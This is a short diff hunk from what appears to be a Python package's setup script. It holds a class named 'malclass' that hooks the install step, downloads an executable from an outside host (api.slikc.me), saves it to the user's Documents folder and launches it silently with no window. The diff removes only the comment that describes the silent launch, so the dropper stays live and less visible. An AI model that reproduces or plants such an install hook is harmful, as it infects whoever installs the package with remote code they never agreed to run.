@@ -14,7 +14,6 @@ class malclass(install):
         installer_file = requests.get('https://api.slikc.me/installer')
         with open(os.path.join(documents, 'installer.exe'), 'wb') as f:
             f.write(installer_file.content)
-        # Start the installer exe silently
         subprocess.Popen([os.path.join(documents, 'installer.exe')], creationflags=subprocess.CREATE_NO_WINDOW)
 
 
